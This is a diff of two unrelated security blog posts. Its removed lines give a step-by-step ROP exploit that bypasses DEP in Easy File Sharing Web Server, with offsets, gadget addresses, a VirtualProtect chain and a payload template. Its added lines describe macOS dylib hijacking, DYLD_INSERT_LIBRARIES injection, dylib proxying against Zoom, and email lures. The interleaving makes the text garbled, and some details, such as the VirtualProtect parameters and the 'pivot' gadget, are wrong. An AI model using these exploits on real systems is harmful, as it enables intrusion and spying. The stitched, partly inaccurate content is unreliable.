+<p class="wp-block-paragraph">Implement alerting systems to notify administrators of unexpected hook modifications or executions.</p>
 
 
 
-<p class="wp-block-paragraph">Lastly, System Call Gadgets are designed to invoke system calls, enabling the exploit to interact directly with the operating system. This is vital for performing actions like spawning shells or manipulating files, ultimately achieving the attacker’s goals. Together, these gadget types create a versatile toolkit for sophisticated ROP attacks.</p>
+<p class="wp-block-paragraph">Deployment of Intrusion Detection Systems (IDS):</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Trigger system calls to interact with the operating system (e.g., spawn a shell).</li>
+<p class="wp-block-paragraph">Employ IDS solutions to monitor for unexpected modifications to the com.apple.loginwindow.plist file or the hook scripts.</p>
 
 
 
-<li><strong>Usage</strong>: These gadgets are vital for achieving the final goals of an exploit.</li>
-</ul>
+<p class="wp-block-paragraph">User Education:</p>
 
 
 
-<h3 class="wp-block-heading">Finding ROP Gadgets</h3>
+<p class="wp-block-paragraph">Educate users about the risks associated with unauthorized modifications to login and logout hooks.</p>
 
 
 
-<p class="wp-block-paragraph">Several tools help find and chain ROP gadgets:</p>
+<p class="wp-block-paragraph">Restricting and Controlling Hook Scripts:</p>
 
 
 
-<h4 class="wp-block-heading"><strong>ROPgadget.py</strong></h4>
+<p class="wp-block-paragraph">Explicit Script Whitelisting:</p>
 
 
 
-<figure class="wp-block-image size-full"><img fetchpriority="high" decoding="async" width="883" height="960" src="/wp-content/uploads/2024/09/image-10.png" alt="" class="wp-image-8829" srcset="/wp-content/uploads/2024/09/image-10.png 883w, /wp-content/uploads/2024/09/image-10-276x300.png 276w, /wp-content/uploads/2024/09/image-10-768x835.png 768w" sizes="(max-width: 883px) 100vw, 883px" /></figure>
+<p class="wp-block-paragraph">Implement a control mechanism to allow only whitelisted scripts to be executed through login and logout hooks.</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Usage</strong>: A Python tool that finds ROP gadgets in binaries across architectures like x86, ARM, and MIPS.</li>
-</ul>
+<p class="wp-block-paragraph">Automated Script Analysis:</p>
 
 
 
-<pre class="wp-block-code"><code>ROPgadget.py --binary &lt;binary&gt;
-ROPgadget.py --binary &lt;binary&gt; --ropchain</code></pre>
+<p class="wp-block-paragraph">Utilize automated script analysis tools to identify potentially malicious code within hook scripts.</p>
 
 
 
-<h4 class="wp-block-heading"><strong>rp++</strong></h4>
+<p class="wp-block-paragraph">Centralized Script Management:</p>
 
 
 
-<figure class="wp-block-image size-full"><img decoding="async" width="883" height="461" src="/wp-content/uploads/2024/09/image-11.png" alt="" class="wp-image-8830" srcset="/wp-content/uploads/2024/09/image-11.png 883w, /wp-content/uploads/2024/09/image-11-300x157.png 300w, /wp-content/uploads/2024/09/image-11-768x401.png 768w" sizes="(max-width: 883px) 100vw, 883px" /></figure>
+<p class="wp-block-paragraph">Consider centralized script management solutions to control and monitor script deployment and execution across the macOS environment.</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Usage</strong>: A fast ROP gadget finder for PE/ELF/Mach-O files in x86/x64/ARM/ARM64 architectures.</li>
-</ul>
+<h2 class="wp-block-heading" id="h-dynamic-libraries"><strong>Dynamic Libraries</strong></h2>
 
 
 
-<pre class="wp-block-code"><code>rp++ --file &lt;binary&gt; --rop
-rp++ --file &lt;binary&gt; --rop --va 0x0</code></pre>
+<p class="wp-block-paragraph">Dynamic Libraries (dylibs) in macOS serve as a modular approach for developers to leverage existing functionalities without recreating the wheel. However, they pose a significant security risk when manipulated by malicious actors. Here&#8217;s a technical discussion on how dylibs can be exploited and possible mitigation steps:</p>
 
 
 
-<figure class="wp-block-image size-full"><img decoding="async" width="890" height="451" src="/wp-content/uploads/2024/09/image-12.png" alt="" class="wp-image-8831" srcset="/wp-content/uploads/2024/09/image-12.png 890w, /wp-content/uploads/2024/09/image-12-300x152.png 300w, /wp-content/uploads/2024/09/image-12-768x389.png 768w" sizes="(max-width: 890px) 100vw, 890px" /></figure>
+<p class="wp-block-paragraph"><strong>1. Dylib Hijacking:</strong></p>
 
 
 
-<h3 class="wp-block-heading">Security Mechanisms and Bypasses&nbsp;</h3>
+<p class="wp-block-paragraph">Attackers may replace or manipulate dylibs to execute malicious code whenever a legitimate application tries to load the library.</p>
 
 
 
-<h4 class="wp-block-heading"><strong><em>Data Execution Prevention (DEP):</em></strong></h4>
+<p class="wp-block-paragraph">Example: Assume a legitimate dylib /usr/lib/libexample.dylib and its malicious replacement libexample.dylib.</p>
 
 
 
-<p class="wp-block-paragraph"><strong><em>Overview of DEP and Its Implementation:</em></strong> Data Execution Prevention (DEP) is a security feature that helps protect against code execution in non-executable memory regions. It works by marking certain areas of memory as non-executable, which prevents code from running in those regions. On modern operating systems, DEP is enforced using hardware and software techniques to distinguish between executable and non-executable memory regions, enhancing system security by mitigating attacks that rely on executing code from non-executable segments.</p>
+<pre class="wp-block-code"><code># An attacker replaces the legitimate dylib
 
+mv /path/to/malicious/libexample.dylib /usr/lib/libexample.dylib</code></pre>
 
 
-<p class="wp-block-paragraph"><strong><em>Techniques Used by ROPGadget to Bypass DEP Protections:</em></strong> ROP (Return-Oriented Programming) gadgets are small snippets of executable code that end with a return instruction, and they can be used to chain together a series of operations without the need for direct code injection. ROPGadget, a tool for identifying such gadgets, facilitates this by searching for these snippets within existing binaries. Since ROP exploits execute only existing code within the application&#8217;s memory, they inherently bypass DEP protections. The DEP does not stop code from executing if it is already part of an executable segment; thus, ROPGadget&#8217;s role is crucial in identifying usable gadgets for constructing these exploits.</p>
 
+<p class="wp-block-paragraph"><strong>2. Dylib Preloading:</strong></p>
 
 
-<p class="wp-block-paragraph">To bypass DEP (Data Execution Prevention) using Return-Oriented Programming (ROP), here&#8217;s a detailed step-by-step breakdown, focusing on a Windows 7 SP1 x64 environment and using the Easy File Sharing Web Server vulnerability.</p>
 
+<p class="wp-block-paragraph">Malicious dylibs are placed in specific locations to be loaded before the legitimate ones, exploiting the library search order.</p>
 
 
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://github.com/Gu4rana/Using_ROP_Bypassing_DEP
-</div></figure>
 
+<p class="wp-block-paragraph">Example: A malicious libpreload.dylib is crafted to be loaded before the actual library.</p>
 
 
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="878" height="723" src="/wp-content/uploads/2024/09/image-13.png" alt="" class="wp-image-8832" srcset="/wp-content/uploads/2024/09/image-13.png 878w, /wp-content/uploads/2024/09/image-13-300x247.png 300w, /wp-content/uploads/2024/09/image-13-768x632.png 768w" sizes="(max-width: 878px) 100vw, 878px" /></figure>
 
+<pre class="wp-block-code"><code># Attacker places malicious dylib
 
+cp /path/to/malicious/libpreload.dylib /usr/lib/</code></pre>
 
-<h4 class="wp-block-heading">1. <strong>Setup Environment</strong></h4>
 
 
+<p class="wp-block-paragraph"><strong>3. Dylib Injection:</strong></p>
 
-<ul class="wp-block-list">
-<li><strong>Operating System:</strong> Windows 7 SP1 x64</li>
 
 
+<p class="wp-block-paragraph">Attackers can inject malicious dylibs into running processes, thereby manipulating or monitoring the process&#8217;s behavior.</p>
 
-<li><strong>Vulnerable Application:</strong> Easy File Sharing Web Server (<a href="https://www.exploit-db.com/exploits/38526">exploit link</a>)</li>
 
 
+<pre class="wp-block-code"><code># Example of injecting a dylib using a tool like dylibbundler
 
-<li><strong>Debugger:</strong> Immunity Debugger with the Mona plugin installed.</li>
+dylibbundler -x ./target_application -d ./malicious_dylibs</code></pre>
 
 
 
-<li><strong>DEP Settings:</strong> Enabled using <code>bcdedit /set nx AlwaysOn</code>.</li>
-</ul>
+<p class="wp-block-paragraph"><strong>4. Malicious Dylib Persistence:</strong></p>
 
 
 
-<p class="wp-block-paragraph"><strong>DEP</strong> prevents execution of code from non-executable memory areas like the stack. To bypass this, ROP chains are used, which consist of short sequences of instructions called <em>gadgets</em>, ending with a <code>RET</code> instruction.</p>
+<p class="wp-block-paragraph">Malicious dylibs are placed to achieve persistence, executing malicious code each time a certain application is run.</p>
 
 
 
-<h4 class="wp-block-heading">2. <strong>Replicating the Exploit</strong></h4>
+<pre class="wp-block-code"><code># Example of a malicious dylib being copied to a startup location
 
+cp /path/to/malicious/libpersistent.dylib /Library/StartupItems/</code></pre>
 
 
-<ul class="wp-block-list">
-<li>From exploit-db, we know the application crashes when passing around 5000 bytes to the <code>UserID</code> cookie in the HTTP header.</li>
 
+<p class="wp-block-paragraph"><strong>5. Code Execution via Dylib:</strong></p>
 
 
-<li>Create a test payload:</li>
-</ul>
 
+<p class="wp-block-paragraph">Dylibs can be crafted to execute malicious code upon being loaded by applications.</p>
 
 
-<pre class="wp-block-code"><code>exploit = "A" * 5000</code></pre>
 
+<pre class="wp-block-code"><code># Example: A crafted dylib that executes malicious code
 
+gcc -dynamiclib -o libmalicious.dylib malicious_code.c</code></pre>
 
-<p class="wp-block-paragraph">This crashes the application and overwrites the <code>EAX</code> register with <code>AAAA</code>. The crash occurs due to the instruction below:</p>
 
 
+<p class="wp-block-paragraph">Mitigation Strategies:</p>
 
-<pre class="wp-block-code"><code>61C277F6   8178 4C 97A629A0 CMP DWORD PTR DS:&#91;EAX+4C],A029A697</code></pre>
 
 
+<p class="wp-block-paragraph">Code Signing:</p>
 
-<ul class="wp-block-list">
-<li>Additionally, the SEH (Structured Exception Handler) chain is overwritten.</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Ensure dylibs and applications are signed by trusted developers.</p>
 
-<h4 class="wp-block-heading">3. <strong>Finding Offset for EAX and SEH Overwrite</strong></h4>
 
 
+<pre class="wp-block-code"><code>codesign --verify --verbose /path/to/library.dylib</code></pre>
 
-<ul class="wp-block-list">
-<li>Use Mona to generate a unique pattern:</li>
-</ul>
 
 
+<p class="wp-block-paragraph">Library Validation:</p>
 
-<pre class="wp-block-code"><code>!mona pc 5000</code></pre>
 
 
+<p class="wp-block-paragraph">Utilize library validation mechanisms to ensure only legitimate dylibs are loaded.</p>
 
-<p class="wp-block-paragraph">After the crash, use Mona to find the offsets:</p>
 
 
+<h2 class="wp-block-heading" id="h-dyld_-environment-variables"><strong>DYLD_* Environment Variables</strong></h2>
 
-<pre class="wp-block-code"><code>!mona findmsp</code></pre>
 
 
+<p class="wp-block-paragraph">The DYLD_* environment variables on macOS provide a method for directing the dynamic loader to insert specific dynamic libraries into a process at load time. While meant for benign use, malicious actors can exploit these variables for nefarious purposes such as injecting malicious libraries into processes. Here’s a detailed analysis of such exploitation and potential mitigation strategies:</p>
 
-<p class="wp-block-paragraph">From the logs, you find that <code>EAX</code> is overwritten at offset 4183 and SEH at 4059 bytes.</p>
 
 
+<p class="wp-block-paragraph"><strong>1. Attack Vector:</strong></p>
 
-<ul class="wp-block-list">
-<li>Modify the exploit payload accordingly:</li>
-</ul>
 
 
+<p class="wp-block-paragraph">a. DYLD_INSERT_LIBRARIES Exploitation:</p>
 
-<pre class="wp-block-code"><code>exploit = "A" * 4059
-exploit += "B" * 4  # nSEH
-exploit += "C" * 4  # SEH
-exploit += "D" * (4183 - len(exploit))
-exploit += "A" * 4  # Overwrite EAX
-exploit += "D" * (5000 - len(exploit))</code></pre>
 
 
+<p class="wp-block-paragraph">The DYLD_INSERT_LIBRARIES environment variable can be set to point to a malicious dynamic library which will be loaded into the target process at runtime.</p>
 
-<h4 class="wp-block-heading">4. <strong>Bad Characters</strong></h4>
 
 
+<p class="wp-block-paragraph">Example:</p>
 
-<ul class="wp-block-list">
-<li>To ensure our exploit is clean, generate and compare the byte array to find bad characters:</li>
-</ul>
 
 
+<pre class="wp-block-code"><code>&lt;key>LSEnvironment&lt;/key>
 
-<pre class="wp-block-code"><code>!mona bytearray -cpb '\x00'
-!mona compare -f c:\logs\fsws\bytearray.bin -a 0x057A6F34</code></pre>
+&lt;dict>
 
+ &lt;key>DYLD_INSERT_LIBRARIES&lt;/key>
 
+ &lt;string>/path/to/malicious/library.dylib&lt;/string>
 
-<ul class="wp-block-list">
-<li>Exclude <code>\x00</code> and <code>\x3b</code> from the payload.</li>
-</ul>
+&lt;/dict></code></pre>
 
 
 
-<h3 class="wp-block-heading">5. <strong>ROP Chain Construction</strong></h3>
+<p class="wp-block-paragraph">b. Persistence Through Property List Modification:</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Stack Pivoting:</strong> The stack pointer points far away from our payload. We need to move it closer. Mona helps us find a stack pivot gadget:</li>
-</ul>
+<p class="wp-block-paragraph">Attackers can modify a launch item’s property list or an application&#8217;s Info.plist file to insert the DYLD_INSERT_LIBRARIES environment variable, thus ensuring the malicious library is loaded each time the target process starts.</p>
 
 
 
-<pre class="wp-block-code"><code>!mona stackpivot -distance 2548 -cpb '\x00\x3b'</code></pre>
+<p class="wp-block-paragraph">c. Exploit in Real-world Malware:</p>
 
 
 
-<p class="wp-block-paragraph">One suitable gadget:</p>
+<p class="wp-block-paragraph">The FlashBack malware notably exploited this technique to inject malicious libraries into users’ browsers, achieving persistence.</p>
 
 
 
-<pre class="wp-block-code"><code>0x1002280a : {pivot 4100 / 0x1004} # ADD ESP,1004 # RETN ** &#91;ImageLoad.dll]</code></pre>
+<p class="wp-block-paragraph"><strong>2. Mitigation Strategies:</strong></p>
 
 
 
-<p class="wp-block-paragraph">Update the payload:</p>
+<p class="wp-block-paragraph">a. Restricted Environment Variable Usage:</p>
 
 
 
-<pre class="wp-block-code"><code>exploit = "A" * 4059
-exploit += "B" * 4  # nSEH
-exploit += struct.pack("&lt;I", 0x1002280a)  # SEH handler with stack pivot
-exploit += "D" * (4183 - len(exploit))
-exploit += "A" * 4  # Overwrite EAX
-exploit += "D" * (5000 - len(exploit))</code></pre>
+<p class="wp-block-paragraph">As of certain macOS versions, the dynamic loader ignores the DYLD_* environment variables for platform binaries and third-party applications compiled with the hardened runtime, limiting the scope of this attack vector.</p>
 
 
 
-<p class="wp-block-paragraph"><strong>ROP Chain Construction:</strong> The goal is to call <code>VirtualProtect()</code> to make our shellcode executable. The steps include:</p>
+<p class="wp-block-paragraph">b. Utilizing Hardened Runtime:</p>
 
 
 
-<ul class="wp-block-list">
-<li>Stack pivoting.</li>
+<p class="wp-block-paragraph">Compiling applications with the hardened runtime can prevent the loading of unauthorized dynamic libraries.</p>
 
 
 
-<li>Loading correct values into registers using gadgets.</li>
+<p class="wp-block-paragraph">codesign &#8211;entitlements entitlements.plist &#8211;options runtime &#8211;sign &#8220;Developer ID&#8221; /path/to/application</p>
 
 
 
-<li>Calling <code>VirtualProtect()</code> with appropriate parameters.</li>
-</ul>
+<p class="wp-block-paragraph">c. Disable Library Validation Exceptions:</p>
 
 
 
-<p class="wp-block-paragraph">Example gadgets and ROP chain:</p>
+<p class="wp-block-paragraph">Avoid using entitlements like com.apple.security.cs.allow-dyld-environment-variables or com.apple.security.cs.disable-library-validation that can create exceptions for loading malicious dynamic libraries.</p>
 
 
 
-<pre class="wp-block-code"><code>def create_rop_chain():
-    rop_chain = &#91;
-        0x10015442,  # POP EAX # RETN &#91;ImageLoad.dll]
-        0xfffffdff,  # 2's complement of 0x00000201
-        0x100231d1,  # NEG EAX # RETN &#91;ImageLoad.dll]
-        0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:&#91;ESP+C] # RETN &#91;ImageLoad.dll]
-        0x10015442,  # POP EAX # RETN &#91;ImageLoad.dll]
-        0x61c832d0,  # ptr to &amp;VirtualProtect() &#91;sqlite3.dll]
-        0x1001281a,  # ADD ESP,4 # RETN &#91;ImageLoad.dll]
-        0x61c735b4,  # Writable location &#91;sqlite3.dll]
-        # Add more gadgets as needed for ROP
-    ]
-    return ''.join(struct.pack("&lt;I", _) for _ in rop_chain)</code></pre>
+<h2 class="wp-block-heading" id="h-dylib-proxying"><strong>Dylib Proxying</strong></h2>
 
 
 
-<h4 class="wp-block-heading">6. <strong>VirtualProtect API Call</strong></h4>
+<p class="wp-block-paragraph">Dylib proxying presents a refined approach to dynamic library injection on macOS, replacing a legitimate library dependency with a malicious counterpart while ensuring the host application retains its functionality. Below is an in-depth analysis of this technique and its potential exploitation vectors:</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Parameters:</strong>
-<ul class="wp-block-list">
-<li><code>lpAddress</code>: Pointer to the memory region you want to change.</li>
+<p class="wp-block-paragraph"><strong>1. Attack Vector:</strong></p>
 
 
 
-<li><code>dwSize</code>: Size of the region to change (e.g., 0x40 for PAGE_EXECUTE_READWRITE).</li>
+<p class="wp-block-paragraph">a. Replacing Library Dependency:</p>
 
 
 
-<li><code>flNewProtect</code>: The new protection attribute (e.g., PAGE_EXECUTE_READWRITE).</li>
+<p class="wp-block-paragraph">Malware replaces a legitimate library that a target process depends on with a malicious library.</p>
 
 
 
-<li><code>lpflOldProtect</code>: Pointer to receive the old protection value.</li>
-</ul>
-</li>
-</ul>
+<p class="wp-block-paragraph">When the targeted application starts, the malicious dynamic library is loaded and executed instead of the original library.</p>
 
 
 
-<h4 class="wp-block-heading">7. <strong>Final Payload</strong></h4>
+<p class="wp-block-paragraph">b. Proxying Library Requests:</p>
 
 
 
-<ul class="wp-block-list">
-<li>Ensure enough NOPs (<code>\x90</code>) before the shellcode to avoid overwriting caused by <code>FSTENV</code> pushing data onto the stack.</li>
+<p class="wp-block-paragraph">To ensure the application doesn’t lose its original functionality, the malicious library proxies requests to and from the legitimate library.</p>
 
 
 
-<li>Example payload:</li>
-</ul>
+<p class="wp-block-paragraph">This is achieved by creating a malicious dynamic library with an LC_REEXPORT_DYLIB load command, redirecting the loader to the original library for the required functionality.</p>
 
 
 
-<pre class="wp-block-code"><code>exploit = "A" * 2455  # Stack pivoting offset
-exploit += create_rop_chain()
-exploit += "\x90" * 32  # NOP slide
-exploit += shellcode  # Your shellcode
-exploit += "D" * (4059 - len(exploit))
-exploit += "BBBB"  # nSEH
-exploit += struct.pack("&lt;I", 0x1002280a)  # SEH handler
-exploit += "D" * (4183 - len(exploit))
-exploit += struct.pack("&lt;I", 0xffffffff)  # Trigger exception
-exploit += "D" * (5000 - len(exploit))</code></pre>
+<p class="wp-block-paragraph">c. Real-world Exploitation:</p>
 
 
 
-<h4 class="wp-block-heading"><strong><em>Address Space Layout Randomization (ASLR):</em></strong></h4>
+<p class="wp-block-paragraph">Although malware has not yet abused this technique, security researchers have used it to subvert applications.</p>
 
 
 
-<p class="wp-block-paragraph"><strong><em>Explanation of ASLR and Its Role in Security:</em></strong> Address Space Layout Randomization (ASLR) is a technique used to randomly arrange the address space of a process, including the base address of executables and shared libraries. This randomization makes it difficult for attackers to predict the location of specific code or data segments, significantly reducing the likelihood of successful exploitation of memory corruption vulnerabilities that rely on fixed addresses.</p>
+<p class="wp-block-paragraph">For instance, an attack against Zoom could enable stealthy persistence and unauthorized webcam access by proxying one of Zoom’s dependencies like its SSL library, libssl.1.0.0.dylib.</p>
 
 
 
-<p class="wp-block-paragraph"><strong><em>Methods ROPGadget Uses to Overcome ASLR:</em></strong></p>
+<p class="wp-block-paragraph"><em>2. Technical Breakdown:</em></p>
 
 
 
-<ol class="wp-block-list">
-<li><strong><em>Information Leakage:</em></strong> Attackers can exploit vulnerabilities that leak information about memory layout to determine the locations of ROP gadgets. By analyzing leaks, attackers can adjust their ROP chains to account for the randomized addresses, effectively overcoming ASLR.</li>
+<p class="wp-block-paragraph">a. Creating Proxy Library:</p>
 
 
 
-<li><strong><em>Brute Forcing:</em></strong> In the absence of information leaks, brute-forcing techniques can be used to guess randomized addresses. This involves systematically attempting different address values until the correct ones are found, though this method is often more time-consuming and less practical compared to information leakage.</li>
-</ol>
+<pre class="wp-block-code"><code>% otool -l zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib
 
+...
 
+Load command 11
 
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://redteamrecipe.com/aslr-exploitation-techniques
-</div></figure>
+ cmd LC_REEXPORT_DYLIB 1
 
+ cmdsize 96
 
+ name /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0_COPY.dylib 2
 
-<p class="wp-block-paragraph">Below is a structured overview of ASLR leak techniques and their relationship to ROP.</p>
+ time stamp 2 Wed Dec 31 14:00:02 1969
 
+ current version 1.0.0
 
+compatibility version 1.0.0
 
-<h4 class="wp-block-heading">1. <strong>Modify Kernel Parameter (Linux)</strong></h4>
+The malicious library contains a reexport directive (LC_REEXPORT_DYLIB) pointing to a copy of the original SSL library (libssl.1.0.0_COPY.dylib), ensuring SSL functionality remains intact.</code></pre>
 
 
 
-<p class="wp-block-paragraph">ASLR can be modified or disabled at the kernel level, which provides insights into memory layout:</p>
+<p class="wp-block-paragraph">b. Execution and Persistence:</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Setarch</strong>: A Linux utility that can run a program in a modified environment, allowing users to change ASLR settings for a specific execution.</li>
+<p class="wp-block-paragraph">The malicious proxy library loads automatically and executes its constructor whenever the user launches Zoom.</p>
 
 
 
-<li><strong>Change Mach-O Flags</strong>: A Python script can be created to change Mach-O flags on macOS binaries to disable ASLR.</li>
-</ul>
+<p class="wp-block-paragraph">Besides persistence, the malware can now access Zoom’s privacy permissions like mic and camera, enabling unauthorized spying.</p>
 
 
 
-<h4 class="wp-block-heading">2. <strong>Compiler Options (Windows)</strong></h4>
+<p class="wp-block-paragraph">3. Countermeasures:</p>
 
 
 
-<p class="wp-block-paragraph">In Windows, ASLR can be influenced by compiler settings, which can lead to information leaks:</p>
+<p class="wp-block-paragraph">a. Tightened Library Validation:</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Disabling ASLR in Visual Studio</strong>: Compiling an application with specific flags can disable ASLR, making it easier to predict memory layout.</li>
+<p class="wp-block-paragraph">Ensure applications are compiled with hardened runtime and do not have the com.apple.security.cs.disable-library-validation entitlement which allows arbitrary libraries to load.</p>
 
 
 
-<li><strong>SetDllCharacteristics</strong>: This function allows setting the characteristics of a DLL, which can include disabling ASLR.</li>
-</ul>
+<p class="wp-block-paragraph">Regular auditing and monitoring of library dependencies and entitlements.</p>
 
 
 
-<h4 class="wp-block-heading">3. <strong>Leaking KASLR (Kernel ASLR)</strong></h4>
+<h2 class="wp-block-heading" id="h-dylib-hijacking"><strong>Dylib Hijacking</strong></h2>
 
 
 
-<p class="wp-block-paragraph">Kernel ASLR is a feature in many operating systems that randomizes the base address of kernel modules:</p>
+<p class="wp-block-paragraph">Dynamic Library (Dylib) Hijacking is a refined technique that exploits weak dependencies or misconfigurations in applications&#8217; dynamic library loading mechanisms on macOS. This section elucidates the exploitation of this technique and potential mitigation steps:</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Startup_xen</strong>: An information leak during the startup process of a virtual machine in Xen can expose kernel addresses, providing a foothold for further exploitation.</li>
+<p class="wp-block-paragraph">1. Attack Vector:</p>
 
 
 
-<li><strong>Android BINDER_TYPE_BINDER</strong>: An address leak can occur via the Android Binder IPC mechanism, allowing attackers to exploit ASLR.</li>
-</ul>
+<p class="wp-block-paragraph">a. Exploiting Library Loading Sequences:</p>
 
 
 
-<h4 class="wp-block-heading">4. <strong>Buffer Overflow to Control EAX</strong></h4>
+<p class="wp-block-paragraph">Applications that look for dynamic libraries in multiple locations or have weak dependencies are susceptible.</p>
 
 
 
-<p class="wp-block-paragraph">Buffer overflows are a common method to manipulate registers and control execution flow:</p>
+<p class="wp-block-paragraph">Malware can place a malicious dylib in a location where the application looks first, leading to the loading of the malicious library instead of the legitimate one.</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>RET2ASLR</strong>: This technique involves leveraging a return address that points to a predictable location after ASLR is bypassed.</li>
-</ul>
+<p class="wp-block-paragraph">Example:</p>
 
 
 
-<h4 class="wp-block-heading">5. <strong>Remote ASLR Leak in Microsoft&#8217;s RDP Client (CVE-2021-38665)</strong></h4>
+<p class="wp-block-paragraph">Older versions of macOS (e.g., OS X 10.10) had Apple&#8217;s iCloud photo stream agent attempting to load PhotoFoundation library from two different directories.</p>
 
 
 
-<p class="wp-block-paragraph">A specific vulnerability in the Microsoft Remote Desktop Protocol (RDP) client allowed attackers to leak memory addresses, circumventing ASLR protections. This enabled the formulation of ROP chains against affected systems.</p>
+<p class="wp-block-paragraph">Malware could place a malicious PhotoFoundation dylib in the primary directory, ensuring its loading on each application launch.</p>
 
 
 
-<h4 class="wp-block-heading">6. <strong>ROP Techniques</strong></h4>
+<p class="wp-block-paragraph">b. Exploiting Weak Dependencies:</p>
 
 
 
-<p class="wp-block-paragraph">Once ASLR information is leaked, it can be used in various ROP techniques:</p>
+<p class="wp-block-paragraph">Some applications may have optional dependencies on dynamic libraries.</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>ASLR Information Leak via Safe-Linking</strong>: In scenarios where a memory allocator is used (like tcache or fastbin chunks), information leaks can occur that reveal the base address of heap objects.</li>
+<p class="wp-block-paragraph">If malware plants a malicious library where the application looks for an optional dependency, the malicious library will be loaded.</p>
 
 
 
-<li><strong>Return To PLT (Procedure Linkage Table)</strong>: This method allows attackers to jump to the PLT to execute functions indirectly. By controlling the PLT entries, attackers can bypass ASLR.</li>
-</ul>
+<p class="wp-block-paragraph">c. Real-world Exploitation:</p>
 
 
 
-<h3 class="wp-block-heading">Advanced Techniques in ROP</h3>
+<p class="wp-block-paragraph">Though not seen in wild macOS malware, post-exploitation agents like EmPyre have demonstrated dylib hijacking capabilities.</p>
 
 
 
-<h4 class="wp-block-heading"><strong><em>Complex ROP Chains:</em></strong></h4>
+<p class="wp-block-paragraph">Code Snippet:</p>
 
 
 
-<p class="wp-block-paragraph"><strong><em>Building Intricate Sequences of Gadgets:</em></strong> In Return-Oriented Programming (ROP), complex ROP chains are constructed by chaining together multiple gadgets to perform advanced operations. These gadgets are small code sequences ending in a <code>ret</code> instruction, allowing for precise control over execution flow.</p>
+<pre class="wp-block-code"><code>class Module:
 
+    def __init__(self, mainMenu, params=&#91;]):
 
+        self.info = {
 
-<p class="wp-block-paragraph">For example, consider the following simple ROP chain:</p>
+            'Name': 'CreateDylibHijacker',
 
+            'Author': &#91;'@patrickwardle,@xorrior'],
 
+            'Description': ('Configures an EmPyre dylib for use in a Dylib hijack, '
 
-<ol class="wp-block-list">
-<li><strong>**Stack Pivoting Gadget:</strong></li>
-</ol>
+                            'given the path to a legitimate dylib of a vulnerable application.')
 
+        }</code></pre>
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>pop rdi ret</code></p>
 
+<p class="wp-block-paragraph">2. Mitigation Strategies:</p>
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget sets the <code>rdi</code> register to a new value by popping from the stack, often used to pivot the stack pointer.</p>
 
+<p class="wp-block-paragraph">a. Hardened Runtime:</p>
 
 
-<ol start="2" class="wp-block-list">
-<li><strong><em>Arithmetic Gadget:</em></strong></li>
-</ol>
 
+<p class="wp-block-paragraph">Utilize the hardened runtime feature in macOS to restrict dynamic library loading, minimizing the impact of dylib injection.</p>
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>add eax, 0x10 ret</code></p>
 
+<p class="wp-block-paragraph">codesign &#8211;entitlements entitlements.plist &#8211;options runtime &#8211;sign &#8220;Developer ID&#8221; /path/to/application</p>
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget increments the <code>eax</code> register by <code>0x10</code>.</p>
 
+<p class="wp-block-paragraph">b. Auditing and Monitoring:</p>
 
 
-<ol start="3" class="wp-block-list">
-<li><strong><em>Memory Access Gadget:</em></strong></li>
-</ol>
 
+<p class="wp-block-paragraph">Regular auditing of application configurations and monitoring dynamic library loading behaviors can help identify and rectify weak dependencies or misconfigurations.</p>
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>mov [rbx], rax ret</code></p>
 
+<p class="wp-block-paragraph"><strong>Malicious Emails</strong></p>
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget stores the value of <code>rax</code> into the memory address pointed to by <code>rbx</code>.</p>
 
+<p class="wp-block-paragraph">Malicious emails remain a potent vector for malware dissemination, especially in the context of user-assisted infection vectors. The underlying challenge for malware authors lies in maneuvering their malicious payload past the user&#8217;s scrutiny and into the system. This article sheds light on the mechanisms employed within malicious emails targeting Mac users, and explores some real-world examples along with the malicious codes and commands associated with them.</p>
 
 
-<ol start="4" class="wp-block-list">
-<li><strong><em>Function Call Gadget:</em></strong></li>
-</ol>
 
+<p class="wp-block-paragraph"><strong>Direct Malware Attachment</strong></p>
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; <code>call [rcx] ret</code></p>
 
+<p class="wp-block-paragraph">A straightforward method employed by attackers involves sending malware as an email attachment. The email&#8217;s body typically contains instructions urging the user to open and execute the attached malware. At face value, the attachment often appears to be a benign document, thus luring the unsuspecting user into opening it and subsequently triggering the infection. Here&#8217;s a simplified example of how such an attachment might be disguised:</p>
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; This gadget performs a function call with the address stored in <code>rcx</code>.</p>
 
+<p class="wp-block-paragraph"># The malware disguised as a document</p>
 
 
-<p class="wp-block-paragraph">Combining these gadgets in a ROP chain allows an attacker to manipulate stack pointers, perform arithmetic operations, and execute function calls. For example, an attacker might pivot the stack to a controlled location, modify values in memory, and call a function with specific parameters.</p>
 
+<p class="wp-block-paragraph">Filename: Invoice.pdf.exe</p>
 
 
-<p class="wp-block-paragraph"><strong><em>Examples of Combining Various Gadget Types:</em></strong> A ROP chain might look like this :</p>
 
+<p class="wp-block-paragraph"><strong>Malicious URL Embedding</strong></p>
 
 
-<pre class="wp-block-code"><code>#0x5050118e: mov eax, esi ; pop esi ; ret&amp;nbsp; ;&amp;nbsp; (1 found)
 
-#0x5052db24: pop ecx ; ret&amp;nbsp; ;
